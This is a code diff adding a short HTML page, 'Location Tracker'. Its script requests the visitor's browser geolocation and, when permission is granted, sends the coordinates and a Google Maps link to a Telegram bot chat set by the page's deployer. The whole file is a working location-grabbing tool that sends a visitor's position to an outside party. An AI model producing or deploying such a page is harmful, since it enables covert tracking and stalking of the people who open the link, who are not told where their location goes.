@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Tracker</title>
+</head>
+<body>
+<h3>📍 Tracking Location...</h3>
+<p id="status">Waiting for permission...</p>
+
+<script>
+const botToken = "YOUR_BOT_TOKEN"; // From BotFather
+const chatId = "YOUR_CHAT_ID";     // From userinfobot
+
+function sendLocation(lat, lon) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📍 Location: ${lat},${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
+  fetch(url)
+    .then(() => document.getElementById('status').innerText = "✅ Location sent!")
+    .catch(() => document.getElementById('status').innerText = "❌ Failed to send location");
+}
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      sendLocation(position.coords.latitude, position.coords.longitude);
+    },
+    error => {
+      document.getElementById('status').innerText = "❌ Permission denied or unavailable.";
+    }
+  );
+} else {
+  document.getElementById('status').innerText = "❌ Geolocation not supported.";
+}
+</script>
+</body>
+</html>
